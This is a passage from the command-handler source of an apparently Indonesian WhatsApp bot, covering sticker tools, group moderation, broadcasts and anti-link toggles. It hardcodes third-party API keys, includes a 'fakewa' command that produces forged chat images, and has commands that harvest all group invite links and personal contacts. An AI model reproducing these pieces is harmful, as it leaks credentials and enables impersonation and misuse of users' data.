               if ((quoted.msg || quoted).seconds > 11) return paycall('Maximum 10 Seconds!')
               let media = await quoted.download()
               let encmedia = await conn.sendVideoAsSticker(m.chat, media, m, {
                  packname: text.split('|')[0] ? text.split('|')[0] : pushname,
                  author: text.split('|')[1] ? text.split('|')[1] : ''
               })
            } else {
               paycall(`Photo/Video?`)
            }
            }
         break
         case 'smeme': {
                let respond = `Send/Reply image/sticker with caption ${prefix + command} text1|text2`
                if (!/image/.test(mime)) return paycall(respond)
                if (!text) return paycall(respond)
                await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
                atas = text.split('|')[0] ? text.split('|')[0] : '-'
                bawah = text.split('|')[1] ? text.split('|')[1] : '-'
                let dwnld = await conn.downloadAndSaveMediaMessage(qmsg)
                let fatGans = await TelegraPh(dwnld)
                let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans}`
                let pop = await conn.sendImageAsSticker(m.chat, smeme, m, {
                    packname: packname,
                    author: author
                })
            }
            break
case 'fakewa': {
if (args.length == 0) return paycall(`Example: ${prefix + command} ShinChan Uwu`)
ini_txt = args.join(" ")
let ini_buffer = await fetchBuffer(`https://api.caliph.biz.id/api/fakechat/wa?name=${pushname}&text=${ini_txt}&num=+${stod.split('@')[0]}&apikey=caliphkey`)
await conn.sendImageAsSticker2(m.chat, ini_buffer, m, {
                  packname: global.packname,
                  author: global.author
               })
       }
break
case 'ttp':
case 'ttp2':
case 'ttp3':
case 'ttp4': 
case 'ttp5': {
if (args.length == 0) return paycall(`Example: ${prefix + command} ShinChan Uwu`)
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
ini_txt = args.join(" ")
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=GataDios&text=${ini_txt}`)
await conn.sendImageAsSticker(m.chat, ini_buffer, m, {
                    packname: `${global.packname}`,
                    author: `${global.author}`
                })
       }
break
case 'attp': 
case 'attp2': {
if (args.length == 0) return paycall(`Example: ${prefix + command} ShinChan Uwu`)
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
ini_txt = args.join(" ")
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=GataDios&text=${ini_txt}`)
await conn.sendFile2(m.chat, ini_buffer, 'sticker.webp', '', m)
       }
break
case 'tts': case 'gtts':{
if (!text) return paycall('Masukin Teksnya')
            let texttts = text
            const shintts = googleTTS.getAudioUrl(texttts, {
                lang: "id",
                slow: false,
                host: "https://translate.google.com",
            })
            return conn.sendMessage(m.chat, {
                audio: {
                    url: shintts,
                },
                mimetype: 'audio/mp4',
                ptt: false,
                fileName: `${text}.mp3`,
            }, {
                quoted: m,
            })
        }
        break
//END STICKER
case 'tes':
case 'ping':
         case 'runtime': {
         const used = process.memoryUsage()
            const cpus = os.cpus().map(cpu => {
               cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
               return cpu
            })
            const cpu = cpus.reduce((last, cpu, _, {
               length
            }) => {
               last.total += cpu.total
               last.speed += cpu.speed / length
               last.times.user += cpu.times.user
               last.times.nice += cpu.times.nice
               last.times.sys += cpu.times.sys
               last.times.idle += cpu.times.idle
               last.times.irq += cpu.times.irq
               return last
            }, {
               speed: 0,
               total: 0,
               times: {
                  user: 0,
                  nice: 0,
                  sys: 0,
                  idle: 0,
                  irq: 0
               }
            })
            let timestamp = speed()
            let latensi = speed() - timestamp
            let neww = performance.now()
            let oldd = performance.now()
            let respon = `⏳Runtime : ${runtime(process.uptime())}\n📌Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_
💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}
${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
            paytod(respon)
            }
            break
            
//GROUP MENU
case 'linkgroup': case 'linkgc': {
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
let response = await conn.groupInviteCode(from)
conn.sendText(from, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break

case 'resetlinkgc':
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
conn.groupRevokeInvite(from)
break

case 'sendlinkgc': {
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let response = await conn.groupInviteCode(from)
conn.sendText(bnnd, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })

}
break

case 'out': case 'leave': case 'leavegc': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
await conn.groupLeave(m.chat)
await m.reply(`Done`)
}
break
            
case 'kick': {
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(from, [users], 'remove')
m.reply(`\`\`\`「 𝙎𝙐𝙆𝙎𝙀𝙎 𝙆𝙄𝘾𝙆 」\`\`\``)
}
break

case 'add': {
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(from, [users], 'add')
}
break

case 'promote': {
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(from, [users], 'promote')
}
break

case 'demote': {
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(from, [users], 'demote')
}
break
case 'listpc': {
                 let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `🐼 *PERSONAL CHAT LIST*\n\nTotal Chat : ${anulistp.length} Chat\n\n`
                 for (let i of anulistp) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `🐼 *Name :* ${nama}\n🐼 *User :* @${i.split('@')[0]}\n🐼 *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 conn.sendTextWithMentions(m.chat, teks, m)
             }
             break
case 'listgc': {
                 let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `🐼*GROUP CHAT LIST*\n\nTotal Group : ${anulistg.length} Group\n\n`
                 for (let i of anulistg) {
                     let metadata = await conn.groupMetadata(i)
                     let response = await conn.groupInviteCode(i)
                     teks += `🐼 *Name :* ${metadata.subject}\n🐼 *LinkGc :* https://chat.whatsapp.com/${response}\n🐼 *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}\n🐼 *ID :* ${metadata.id}\n🐼 *Made :* ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}\n🐼 *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 conn.sendTextWithMentions(m.chat, teks, m)
             }
             break
case 'hidetag': case 'hid':
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
conn.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)
})
break
case 'totag': case 'tg':
                if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
                conn.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
                break

case 'setgc': case 'editgrup': case 'editgroup': {   
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
if (args[0] === 'close'){
await conn.groupSettingUpdate(from, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'open'){
await conn.groupSettingUpdate(from, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
} else {
conn.sendMessage(m.chat, { image: ppnyauser, caption: ` Silahkan Ketik
Group Open
Group Close`}, {quoted:m}) 
 }
}
break
case 'closetime': {
if (!m.isGroup) return m.reply(`*khusus Grup bodo*`)
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return paytod('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
paycall(`Waktu Tutup ${q} Mulai dari sekarang`)
setTimeout(() => {
var nomor = m.participant
const close = `*Tepat waktu* Grup Tertutup By Admin\nSekarang Hanya Admin yang Dapat Mengirim Pesan`
conn.groupSettingUpdate(from, 'announcement')
paytod(close)
}, timer)
}
break
case 'setppgc': {
if (!m.isGroup) return m.reply(`*khusus Grup bodo*`)
if (!quoted) return paycall(`Send/Reply Images With Captions ${prefix+command}`)
if (!/image/.test(mime)) return paycall(`Send/Reply Image With Caption ${prefix + command}`)
if (/webp/.test(mime)) return paycall(`Send/Reply Image With Caption ${prefix + command}`)
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
var media = await conn.downloadAndSaveMediaMessage(quoted)
try {
if (args[0] == "/full") {
var { img } = await generateProfilePicture(media)
await conn.query({ tag: 'iq',attrs: { to: m.chat, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})
} else { await conn.updateProfilePicture(m.chat, { url: media }) }
m.reply('DONE')
} catch { reply('Gagal Mengganti Photo Profile') }
}
break

case 'editinfo': {
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
 if (args[0] === 'open'){
await conn.groupSettingUpdate(from, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
 } else if (args[0] === 'close'){
await conn.groupSettingUpdate(from, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
 } else {
 conn.sendMessage(m.chat, { image: ppnyauser, caption: ` Silahkan Ketik
Editinfo Open
Editinfo Close`}, {quoted:m}) 

}
}
break

case 'join': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!text) throw 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
let result = args[0].split('https://chat.whatsapp.com/')[1]
await conn.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break

case 'editsubjek': {
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!text) throw 'Text nya ?'
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
await conn.groupUpdateSubject(from, text).then((res)).catch((err) => m.reply(jsonformat(err)))
}
break

case 'editdesk':{
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!text) throw 'Text Nya ?'
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
await conn.groupUpdateDescription(from, text).then((res)).catch((err) => m.reply(jsonformat(err)))
}
break
case 'opentime': {
if (!m.isGroup) return m.reply(`*khusus Grup bodo*`)
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return paytod('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
paycall(`Waktu Terbuka ${q} Mulai dari sekarang`)
setTimeout(() => {
var nomor = m.participant
const open = `*Tepat waktu* Grup Dibuka By Admin\n Sekarang Anggota Dapat Mengirim Pesan`
conn.groupSettingUpdate(from, 'not_announcement')
paytod(open)
}, timer)
}
break
case 'bc':
            case 'broadcast': {
               if (!isCreator) return m.reply('*Khusus Owner Bot*')
               if (!text) return paytod('Text?')
               let teksnya = `${text}\n\n\nTanggal: ${tanggal}\nJam: ${time}`
               let getGroups = await conn.groupFetchAllParticipating()
               let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
               let anu = groups.map(v => v.id)
               for (let i of anu) {
               await sleep(1500)
                  if (/image/.test(mime)) {
                     var media = await quoted.download()
                     await conn.sendMessage(i, { 
                        image:media,
                        caption: teksnya
                     })
                  } else if (/video/.test(mime)) {
                     var media = await quoted.download()
                     await conn.sendMessage(i, {
                        video: media,
                        caption: teksnya
                     })
                  } else if (text) {
                     await conn.sendMessage(i, {
                        text: teksnya
                     })
                  }
               }
               m.reply(`Success`)
            }
            break
case 'tagall': {
if (!m.isGroup) return
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
let teks = `══✪〘 *👥 Tag All* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
conn.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: blue })
}
break

case'demoteall':
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.groupParticipantsUpdate(from, mems, 'demote')
break

case 'promoteall':
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.groupParticipantsUpdate(from, mems, 'promote')
break

case "welcome":
{
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (welcm) return m.reply('Sudah Aktif')
wlcm.push(from)
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.sendMessage(from, {text: `Fitur Welcome Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcm) return m.reply('Sudah Non Aktif')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
m.reply('Sukses Mematikan Welcome  di group ini')
}
}
break

case 'bcgc': case 'bcgroup': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
let getGroups = await conn.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
//conn.sendMessage(i, {text: `${text}`}, {quoted: fkontak})
let a = `${ownername}'s Broadcast\n\n` + '```' + `Message: ${text}\n\n\n𝐓𝐚𝐧𝐠𝐠𝐚𝐥: ${tanggal}\n𝐉𝐚𝐦: ${time}\n𝐉𝐚𝐦: ${wita}\n𝐉𝐚𝐦: ${wit}\n` + '```'
                    conn.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: `Sent in ${i.length} Group`,
                                thumbnailUrl: 'https://telegra.ph/file/b529b1098a8399e834b52.jpg',
                                sourceUrl: ig,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
    }
m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break

case 'antilinkinstagram': case 'antilinkig': case 'antilinkinsta': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
if (args[0] === "on") {
if (AntiLinkInstagram) return paycall('Already activated')
ntilinkig.push(from)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
paycall('Success in turning on instagram antilink in this group')
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the instagram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkInstagram) return paycall('Already deactivated')
let off = ntilinkig.indexOf(from)
ntilinkig.splice(off, 1)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
paycall('Success in turning off instagram antilink in this group')
} else {
  await paycall(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antilink': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
if (args[0] === "on") {
if (AntiLink) return m.reply('Sudah Aktif')
ntilink.push(from)
fs.writeFileSync('./database/antilink.json', JSON.stringify(ntilink))
paytod('Succes menyalakan antilink di group ini 🌷')
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
//conn.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send group link in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLink) return m.reply('Sudah Mati')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(ntilink))
paytod('Succes mematikan antilink di group ini 🌷')
} else {
await paytod(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antiwame': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
if (args[0] === "on") {
if (antiWame) return paytod('Already activated')
ntwame.push(from)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
paytod('Sukses dalam mengaktifkan antiwame dalam grup ini')
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
//conn.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send wa.me in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiWame) return paytod('Already deactivated')
let off = nttoxic.indexOf(from)
ntwame.splice(off, 1)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
paytod('Sukses dalam mematikan antiwame dalam grup ini')
} else {
  await paytod(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
  case 'antilinkch': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
if (args[0] === "on") {
if (AntiLinkChannel) return paycall('Already activated')
ntilinkchannel.push(from)
fs.writeFileSync('./database/antilinkchannelwa.json', JSON.stringify(ntilinkchannel))
paycall('Sukses mengaktifkan antilink Channel WhatsApp di grup ini')
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
//conn.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirimkan link Saluran WhatsApp di grup ini atau Anda akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkChannel) return paycall('Already deactivated')
let off = ntilinkchannel.indexOf(from)
ntilinkchannel.splice(off, 1)
fs.writeFileSync('./database/antilinkchannelwa.json', JSON.stringify(ntilinkchannel))
paycall('Sukses mematikan antilink Channel WhatsApp di grup ini')
} else {
  await paycall(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antisticker':{
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
if (args.length < 1) return paytod('on/off?')
if (args[0]  === 'on'){
if (AntiSticker) return paycall(`Already activated`)
antisticker.push(from)
fs.writeFileSync('./database/antisticker.json', JSON.stringify(antisticker))
paycall('Anti Sticker Activated')
} else if (args[0] === 'off'){
let antisticker1 = antisticker.indexOf(from)
antisticker.splice(antisticker1, 1)
fs.writeFileSync('./database/antisticker.json', JSON.stringify(antisticker))
paycall('Anti Sticker deactivated')
               }
               }
            break
case 'antionce':{
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
if (args.length < 1) return paytod('on/off?')
if (args[0]  === 'on'){
if (AntiViewOnce) return paycall(`Already activated`)
antiviewonce.push(from)
fs.writeFileSync('./database/viewonce.json', JSON.stringify(antiviewonce))
paycall('Anti View Once Activated')
} else if (args[0] === 'off'){
let antionce1 = antiviewonce.indexOf(from)
antiviewonce.splice(antionce1, 1)
fs.writeFileSync('./database/viewonce.json', JSON.stringify(antiviewonce))
paycall('Anti View Once deactivated')
               }
               }
            break
  case 'antieval': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
if (args[0] === "on") {
if (AntiEval) return paycall('Already activated')
nteval.push(from)
fs.writeFileSync('./database/antieval.json', JSON.stringify(nteval))
paycall('Sukses mengaktifkan anti Eval WhatsApp di grup ini')
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan Eval sembarangan di grup ini atau Anda akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiEval) return paycall('Already deactivated')
let off = nteval.indexOf(from)
nteval.splice(off, 1)
fs.writeFileSync('./database/antieval.json', JSON.stringify(nteval))
paycall('Sukses mematikan anti Eval WhatsApp di grup ini')
} else {
  await paycall(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
  case 'autostickergc':
            case 'autostiker':
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
if (args.length < 1) return paycall('type auto sticker on to enable\ntype auto sticker off to disable')
if (args[0]  === 'on'){
if (isAutoSticker) return paycall(`Already activated`)
autosticker.push(from)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
paycall('autosticker activated')
} else if (args[0] === 'off'){
let anuticker1 = autosticker.indexOf(from)
autosticker.splice(anuticker1, 1)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
paycall('auto sticker deactivated')
}
break
  case 'antivirus': case 'antivirtex': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
if (args[0] === "on") {
if (antiVirtex) return paycall('Already activated')
ntvirtex.push(from)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
paycall('Sukses mengaktifkan antivirus di grup ini')
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nTidak boleh ada siapapun yang mengirim virus di grup ini, anggota yang mengirim akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiVirtex) return paycall('Already deactivated')
let off = ntvirtex.indexOf(from)
ntvirtex.splice(off, 1)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
paycall('Sukses mematikan antivirus grup ini')
} else {
  await paycall(`Silakan Ketik Opsinya\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case "antitoxic":
{
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (welcmm) return m.reply('Sudah Aktif')
wlcmm.push(from)
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
